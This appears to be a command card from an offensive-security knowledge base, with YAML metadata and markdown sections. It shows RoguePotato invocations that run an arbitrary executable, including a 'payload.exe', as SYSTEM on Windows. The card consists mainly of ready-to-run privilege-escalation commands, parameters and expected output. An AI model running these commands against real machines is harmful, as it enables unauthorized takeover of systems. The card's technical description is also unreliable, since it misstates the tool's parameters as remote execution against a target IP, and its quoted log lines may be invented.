---
id: new-uuid-3
name: roguepotato-remote-execution-with-local-resolver-9999
type: command
executor: cmd
data: RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE" -l 9999
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - priv-esc
  - dcom
  - roguepotato
verified: true
validated: true
---

# roguepotato-remote-execution-with-local-resolver-9999

## Command

```cmd
RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE" -l 9999
```

## Description

This variation of RoguePotato runs the OXID resolver locally on the attacker's machine at port 9999, allowing the target's forwarded DCOM traffic to be intercepted for impersonation and remote SYSTEM execution without needing the resolver on the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -r $_TARGET_IP | IP address of the remote target | Yes |
| -e "$_EXECUTABLE" | Path to the executable to run as SYSTEM on target | Yes |
| -l 9999 | Local port for the OXID resolver | Yes |

## Examples

### Basic Usage

```cmd
RoguePotato.exe -r 10.0.0.5 -e "C:\windows\system32\cmd.exe" -l 9999
```

### Advanced Usage

With custom exec: RoguePotato.exe -r $_TARGET_IP -e "C:\temp\payload.exe" -l 9999

## Expected Output

Logs show 'Resolver listening on 9999' and 'Token impersonated successfully'; the command executes as SYSTEM on the target, potentially spawning a process visible via tasklist on target.

## Related

- [[procedures/Rogue-Potato-Impersonation-Privileges]]
- [[tools/roguepotato]]
